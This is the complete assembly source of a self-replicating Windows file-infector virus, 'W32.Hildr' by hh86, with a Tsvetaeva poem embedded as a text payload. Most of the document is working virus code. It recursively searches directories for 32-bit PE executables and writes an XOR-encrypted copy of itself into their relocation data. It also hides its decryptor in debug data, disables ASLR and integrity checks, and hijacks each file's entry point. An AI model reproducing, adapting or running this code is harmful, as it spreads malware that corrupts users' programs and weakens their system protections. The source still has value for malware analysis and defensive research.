comment °

W32.Hildr by hh86

- direct action file infector of PE32 exe files in current dirs and its subdirectories 
- overwrites reloc data with the virus body
- [new] simple stealth, overwrites debug data in code section with decryptor
- infects files with ANSI/Unicode names
- uses CRC32 instead of API names for smaller code

an attempt to target the debug data in PE files already happened many years ago
but its author looked for a section called ".deb" whatever that is :)

---
code must not contain null dwords until hildr_null

°

.386
.model  flat, stdcall
include hildr.inc

.code
assume fs:nothing

link_text       proc     near
        call    text_end

text_begin      label    near
        db      49h, 20h, 63h, 68h
        db      72h, 69h, 73h, 74h
        db      65h, 6eh, 20h, 79h
        db      6fh, 75h, 72h, 20h
        db      66h, 72h, 69h, 67h
        db      68h, 74h, 65h, 6eh
        db      69h, 6eh, 67h, 20h
        db      66h, 6ch, 69h, 67h
        db      68h, 74h, 3ah, 0ah
        db      0dh, 59h, 6fh, 75h
        db      6eh, 67h, 20h, 65h
        db      61h, 67h, 6ch, 65h
        db      2ch, 20h, 72h, 69h
        db      73h, 65h, 20h, 69h
        db      6eh, 20h, 74h, 68h
        db      65h, 20h, 61h, 69h
        db      72h, 21h, 0ah, 0dh
        db      59h, 6fh, 75h, 20h
        db      73h, 74h, 61h, 72h
        db      65h, 64h, 20h, 61h
        db      74h, 20h, 74h, 68h
        db      65h, 20h, 73h, 75h
        db      6eh, 21h, 20h, 2dh
        db      20h, 6dh, 79h, 20h
        db      6ch, 69h, 67h, 68h
        db      74h, 0ah, 0dh, 41h
        db      6eh, 64h, 20h, 64h
        db      65h, 6ch, 69h, 63h
        db      61h, 74h, 65h, 20h
        db      67h, 61h, 7ah, 65h
        db      20h, 63h, 61h, 6eh
        db      27h, 74h, 20h, 63h
        db      6fh, 6dh, 70h, 61h
        db      72h, 65h, 2eh, 0ah
        db      0dh, 0ah, 0dh, 49h
        db      20h, 73h, 74h, 6fh
        db      6fh, 64h, 2ch, 20h
        db      6dh, 6fh, 72h, 65h
        db      20h, 74h, 65h, 6eh
        db      64h, 65h, 72h, 20h
        db      74h, 68h, 61h, 6eh
        db      20h, 74h, 68h, 6fh
        db      73h, 65h, 0ah, 0dh
        db      57h, 68h, 6fh, 27h
        db      76h, 65h, 20h, 77h
        db      69h, 74h, 6eh, 65h
        db      73h, 73h, 65h, 64h
        db      20h, 79h, 6fh, 75h
        db      20h, 64h, 69h, 73h
        db      61h, 70h, 70h, 65h
        db      61h, 72h, 2eh, 2eh
        db      2eh, 0ah, 0dh, 49h
        db      27h, 6dh, 20h, 6bh
        db      69h, 73h, 73h, 69h
        db      6eh, 67h, 20h, 79h
        db      6fh, 75h, 20h, 6eh
        db      6fh, 77h, 20h, 2dh
        db      20h, 61h, 63h, 72h
        db      6fh, 73h, 73h, 0ah
        db      0dh, 54h, 68h, 65h
        db      20h, 67h, 61h, 70h
        db      20h, 6fh, 66h, 20h
        db      61h, 20h, 74h, 68h
        db      6fh, 75h, 73h, 61h
        db      6eh, 64h, 20h, 79h
        db      65h, 61h, 72h, 73h
        db      2eh, 0ah, 0dh
        db      "Marina Tsvetaeva (1916)"

text_end        label    near
        pop     ecx
        xor     ebx, ebx
        push    500h
        push    ebx
        push    ebx
        push    offset text_end - offset text_begin
        push    ecx 
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
link_text       endp

code_begin      label    near
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.dwImageBaseAddress]
        mov     ecx, offset link_text
        sub     ecx, eax
        push    ecx
        pushad
                
;-------------------------------------------------------------------------------
;here begins the code in infected files
;-------------------------------------------------------------------------------

hildr_exe       label    near
        add     dword ptr [esp + sizeof regmap], eax
        call    init_seh

mainseh_delta   label    near
        pop     eax
        pop     eax
        pop     esp
        xor     edx, edx
        pop     dword ptr fs:[edx]
        pop     eax
        popad
        ret

krncrc_list     label    near 
        dd      0b09315f4h                   ;CloseHandle
        dd      040cf273dh                   ;CreateFileMappingW
        dd      0a1efe929h                   ;CreateFileW
        dd      0d82bf69ah                   ;FindClose
        dd      03d3f609fh                   ;FindFirstFileW
        dd      081f39c19h                   ;FindNextFileW
        dd      07fbc7431h                   ;GlobalAlloc
        dd      0636b1e9dh                   ;GlobalFree
        dd      0a89b382fh                   ;MapViewOfFile
        dd      09d6231ceh                   ;SetCurrentDirectoryW
        dd      0e1bf2253h                   ;SetFileAttributesW
        dd      0391ab6afh                   ;UnmapViewOfFile
        db      0

init_seh        label    near
        pop     esi
        push    esi
        xor     edx, edx
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.lpLoaderData]
        mov     eax, dword ptr [eax + _PEB_LDR_DATA.dwInLoadOrderModuleList.FLink]
        mov     eax, dword ptr [eax]
        mov     eax, dword ptr [eax]
        mov     ebp, dword ptr [eax + 18h]

;-------------------------------------------------------------------------------
;DLL walker
;-------------------------------------------------------------------------------

        mov     ebx, ebp
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        add     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER.e_lfanew shl 1]

walk_names      label    near
        mov     eax, ebp
        mov     edi, ebp
        inc     edx                          ;skip first one by default
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     edi, dword ptr [eax + edx * 4]
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi + (offset krncrc_list - offset mainseh_delta)], eax
        jne     walk_names
        mov     eax, ebp
        mov     edi, ebp
        add     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        movzx   edi, word ptr [edi + edx * 2]
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lods    dword ptr [esi]
        sub     cl, byte ptr [esi + (offset krncrc_list - offset mainseh_delta)]
        jnz     walk_names

;-------------------------------------------------------------------------------
;find files to infect in the current directory
;-------------------------------------------------------------------------------

        mov     ebp, esp
        mov     ebx, ecx
        push    sizeof level_data * MAX_LEVELS + sizeof WIN32_FIND_DATA * 2
        push    GMEM_ZEROINIT
        call    dword ptr [ebp + kernel32.kGlobalAlloc]
        xchg    edi, eax
        lea     esi, dword ptr [edi + sizeof level_data * MAX_LEVELS]

find_files      label    near
        push    "*"
        mov     ecx, esp
        push    esi
        push    ecx
        call    dword ptr [ebp + kernel32.kFindFirstFileW]
        scas    dword ptr [edi]              ;sizeof level_data
        mov     dword ptr [edi], eax
        pop     ecx
        inc     eax
        jz      level_check

find_loop       label    near
        lea     eax, dword ptr [esi + WIN32_FIND_DATA.cFileName]
        cmp     byte ptr [eax], "."
        je      skip_level
        test    byte ptr [esi], FILE_ATTRIBUTE_DIRECTORY
        je      map_file
        push    eax
        call    dword ptr [ebp + kernel32.kSetCurrentDirectoryW]
        dec     eax
        jz      find_files
        
        ;maybe tomorrow we will embrace this chance

skip_level      label    near
        push    esi
        push    dword ptr [edi + level_data.findhandler]
        call    dword ptr [ebp + kernel32.kFindNextFileW]
        test    eax, eax
        jnz     find_loop
        push    dword ptr [edi + level_data.findhandler]
        call    dword ptr [ebp + kernel32.kFindClose]

level_check     label    near
        sub     edi, sizeof level_data
        cmp     dword ptr [edi], ebx
        je      free_mem
        push    ebx
        push    2e002eh
        push    esp
        call    dword ptr [ebp + kernel32.kSetCurrentDirectoryW]
        pop     eax
        pop     eax
        jmp     skip_level

;-------------------------------------------------------------------------------
;change object attributes to archive, create a map view if possible
;-------------------------------------------------------------------------------

map_file        label    near
        push    dword ptr [esi]
        push    eax
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    3                            ;GENERIC_READ | GENERIC_WRITE
        push    eax
        push    FILE_ATTRIBUTE_ARCHIVE
        push    eax
        call    dword ptr [ebp + kernel32.kSetFileAttributesW]
        call    dword ptr [ebp + kernel32.kCreateFileW]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    PAGE_READWRITE
        push    ebx
        push    eax
        call    dword ptr [ebp + kernel32.kCreateFileMappingW]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    FILE_MAP_WRITE
        push    eax
        call    dword ptr [ebp + kernel32.kMapViewOfFile]
        push    eax
        pushad
        call    infect_exe
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    dword ptr [ebp + kernel32.kUnmapViewOfFile]
        call    dword ptr [ebp + kernel32.kCloseHandle]
        call    dword ptr [ebp + kernel32.kCloseHandle]
        call    dword ptr [ebp + kernel32.kSetFileAttributesW]
        jmp     skip_level

;-------------------------------------------------------------------------------
;free find memory buffer
;-------------------------------------------------------------------------------

free_mem        label    near
        push    edi
        call    dword ptr [ebp + kernel32.kGlobalFree]
        
;-------------------------------------------------------------------------------
;common exit point
;-------------------------------------------------------------------------------

breakpoint      label    near
        int     3

;-------------------------------------------------------------------------------
;parse file struct
;signatures must match those of PE files
;-------------------------------------------------------------------------------

infect_exe      label    near

        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        cmp     word ptr [eax], "ZM"
        jne     breakpoint
        push    eax
        add     eax, dword ptr [eax + IMAGE_DOS_HEADER.e_lfanew]
        cmp     dword ptr [eax], "EP"
        jne     breakpoint

;-------------------------------------------------------------------------------
;32-bit machine
;discard DLL files (because they do not have own PEB) and system files
;do not test IMAGE_FILE_32BIT_MACHINE because it is ignored by Windows even for PE32+
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS.FileHeader.Machine], IMAGE_FILE_MACHINE_I386
        jne     breakpoint
        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.Characteristics]
        test    cl, IMAGE_FILE_EXECUTABLE_IMAGE
        jz      breakpoint
        test    ch, high (IMAGE_FILE_DLL or IMAGE_FILE_SYSTEM)
        jnz     breakpoint

;-------------------------------------------------------------------------------
;before check size of optional header make sure optional header is PE32
;IMAGE_NT_OPTIONAL_HDR_MAGIC must match PE32 structure (not ROM, not 64-bit) configuration
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.Magic], IMAGE_NT_OPTIONAL_HDR32_MAGIC
        jne     breakpoint

;-------------------------------------------------------------------------------
;SizeOfOptionalHeader must indicate that it covers at least until debug fields entries
;-------------------------------------------------------------------------------

        movzx   edx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
        cmp     dx, (IMAGE_DIRECTORY_ENTRY_DEBUG_DIRECTORY - IMAGE_NT_HEADERS.OptionalHeader.Magic) + 8
        jnae    breakpoint
        cmp     dx, (IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG_TABLE - IMAGE_NT_HEADERS.OptionalHeader.Magic) + 8
        jnae    skip_ldcchk
        cmp     dword ptr [eax + IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG_TABLE], ebx
        jne     breakpoint

skip_ldcchk     label    near

;-------------------------------------------------------------------------------
;Windows CUI/GUI subsystem file only
;-------------------------------------------------------------------------------

        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.Subsystem]
        dec     ecx
        dec     ecx
        jz      find_dirs
        dec     ecx
        jnz     breakpoint
        
;-------------------------------------------------------------------------------
;find the reloc table
;-------------------------------------------------------------------------------

find_dirs       label    near
        pop     ebp
        imul    cx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.NumberOfSections], sizeof IMAGE_SECTION_HEADER
        lea     esi, dword ptr [eax + edx + IMAGE_NT_HEADERS.OptionalHeader.Magic + IMAGE_SECTION_HEADER.VirtualAddress]
        add     esi, ecx
        mov     bl, IMAGE_DIRECTORY_ENTRY_RELOC_TABLE
        add     ebx, eax
        mov     ecx, dword ptr [ebx]
        jecxz   breakpoint
        cmp     dword ptr [ebx + 4], offset hildr_end - offset hildr_exe
        jb      breakpoint
        push    esi
        call    rva2off

;-------------------------------------------------------------------------------
;find the debug directory
;-------------------------------------------------------------------------------

        cmp     dword ptr [ebx + IMAGE_DIRECTORY_ENTRY_DEBUG_DIRECTORY - IMAGE_DIRECTORY_ENTRY_RELOC_TABLE + 4], sizeof IMAGE_DEBUG_DIRECTORY
        jnae    inner_break
        mov     edx, esi
        pop     esi
        push    ecx
        mov     ecx, dword ptr [ebx + IMAGE_DIRECTORY_ENTRY_DEBUG_DIRECTORY - IMAGE_DIRECTORY_ENTRY_RELOC_TABLE]
        jecxz   inner_break
        call    rva2off

;-------------------------------------------------------------------------------
;section must have the executable bit set
;section is infected only if it contains code already, to change this replace test
;with or, and eliminate je
;-------------------------------------------------------------------------------

        test    byte ptr [esi + IMAGE_SECTION_HEADER.Characteristics - IMAGE_SECTION_HEADER.VirtualAddress + 3], IMAGE_SCN_MEM_EXECUTE shr 18h
        je      breakpoint

;-------------------------------------------------------------------------------
;clear *_NX_COMPAT above, then might not need IMAGE_SCN_MEM_EXECUTE in section flags
;-------------------------------------------------------------------------------

        or      byte ptr [edx + IMAGE_SECTION_HEADER.Characteristics - IMAGE_SECTION_HEADER.VirtualAddress + 3], (IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE) shr 18h

;-------------------------------------------------------------------------------
;copy decryptor
;-------------------------------------------------------------------------------

        call    copy_code

decrypt_begin   label    near
        push    offset hildr_exe
        pushad
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.dwImageBaseAddress]
        lea     ecx, dword ptr [eax + offset hildr_exe]

hildrpatch      label    near
        push    ecx
        cdq

DECRYPT_KEY     equ 0ffh
decrypt_loop    label    near 
        xor     byte ptr [ecx], DECRYPT_KEY
        inc     ecx
        cmp     dword ptr [ecx], edx
        jne     decrypt_loop
        ret

decrypt_end     label    near

inner_break     label    near
        int     3

copy_code       label    near
        mov     edi, ecx
        push    offset decrypt_end - offset decrypt_begin
        pop     ecx
        pop     esi
        rep     movs byte ptr [edi], byte ptr [esi]

;-------------------------------------------------------------------------------
;clear *_NO_SEH to enable SEH, and *_FORCE_INTEGRITY to infect files signed files
;clear *_DYNAMIC_BASE to disable ASLR
;set stripped relocs bit
;-------------------------------------------------------------------------------

        and     word ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics], not (IMAGE_DLLCHARACTERISTICS_NO_SEH or IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY or IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
        bts     dword ptr [eax + IMAGE_NT_HEADERS.FileHeader.Characteristics], ecx

;-------------------------------------------------------------------------------
;nullify relocation directory entries in data directories
;-------------------------------------------------------------------------------

        mov     dword ptr [ebx + 4], ecx
        xchg    ecx, dword ptr [ebx]

;-------------------------------------------------------------------------------
;save addresses in decryptor
;-------------------------------------------------------------------------------

        mov     dword ptr [edi - (offset decrypt_end - offset hildrpatch) - 4], ecx
        mov     ecx, dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
        mov     dword ptr [edi - (offset decrypt_end - offset decrypt_begin) + 1], ecx

;-------------------------------------------------------------------------------
;copy hildr to relocs
;-------------------------------------------------------------------------------
        
        pop     edi
        sub     esi, offset decrypt_end - offset hildr_exe
        mov     ecx, offset hildr_null - offset hildr_exe
        xchg    ebp, eax

crypt_loop      label    near
        lods    byte ptr [esi]
        xor     al, DECRYPT_KEY
        stos    byte ptr [edi]
        loop    crypt_loop

;-------------------------------------------------------------------------------
;clear relocs/debug data directory entries and alter entrypoint 
;-------------------------------------------------------------------------------

        mov     dword ptr [ebx + IMAGE_DIRECTORY_ENTRY_DEBUG_DIRECTORY - IMAGE_DIRECTORY_ENTRY_RELOC_TABLE + 4], ecx
        xchg    dword ptr [ebx + IMAGE_DIRECTORY_ENTRY_DEBUG_DIRECTORY - IMAGE_DIRECTORY_ENTRY_RELOC_TABLE], ecx
        mov     dword ptr [ebp + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint], ecx
        int     3

rva2off         label    near
        sub     esi, sizeof IMAGE_SECTION_HEADER
        cmp     dword ptr [esi], ecx
        jnbe    rva2off
        sub     ecx, dword ptr [esi]
        add     ecx, dword ptr [esi + IMAGE_SECTION_HEADER.PointerToRawData - IMAGE_SECTION_HEADER.VirtualAddress]
        add     ecx, ebp
        ret

hildr_null      label    near
        dd      0

hildr_end       label    near

end     code_begin

----
24/11/14
